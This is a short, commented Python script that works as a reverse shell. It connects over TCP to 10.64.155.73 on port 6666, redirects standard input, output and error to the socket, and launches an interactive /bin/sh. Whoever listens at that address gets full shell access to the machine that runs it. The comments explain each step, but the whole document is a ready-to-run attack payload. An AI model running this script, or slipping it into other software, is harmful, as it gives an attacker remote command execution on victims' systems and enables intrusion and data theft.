import socket,subprocess,os;

#use IPV4 && TCP
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);

#connect
s.connect(("10.64.155.73",6666));

#point stdin, stdout and stderr to the network socket
os.dup2(s.fileno(),0);
os.dup2(s.fileno(),1);
os.dup2(s.fileno(),2);

#start a interactive (-i) shell
p=subprocess.call(["/bin/sh","-i"]); 
